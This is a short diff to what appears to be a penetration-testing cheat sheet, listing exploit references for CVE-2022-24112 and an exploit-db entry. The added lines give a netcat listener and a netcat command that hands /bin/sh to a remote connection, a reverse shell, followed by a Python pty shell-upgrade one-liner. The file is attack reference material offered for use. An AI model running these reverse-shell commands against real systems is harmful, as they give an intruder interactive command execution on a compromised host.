@@ -26,6 +26,11 @@ https://github.com/twseptian/cve-2022-24112
 WSGIServer 0.1 (Python 2.7.16)  
 https://www.exploit-db.com/exploits/43113  
 https://www.youtube.com/watch?v=3XgGjEG0lLw  
+# Shell
+## Netcat (listener)
+nc -lvnp 8080
+## Netcat (sender)
+nc 127.0.0.1 8080 -e /bin/sh
 # Shell Upgrade
 ## Python
 python -c 'import pty; pty.spawn("/bin/bash")'
